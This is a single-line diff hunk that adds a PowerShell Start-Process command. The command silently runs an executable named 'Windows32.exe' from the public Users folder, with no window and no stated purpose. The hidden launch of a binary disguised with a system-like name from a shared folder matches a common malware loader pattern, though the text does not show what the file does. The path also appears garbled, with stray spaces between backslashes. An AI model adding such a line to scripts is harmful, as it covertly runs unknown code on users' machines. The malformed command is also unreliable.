@@ -1,0 +1,1 @@
+Start-Process 'C:\ \Users\ \Public\ \Windows32.exe' -ArgumentList '/silent' -NoNewWindow -Wait
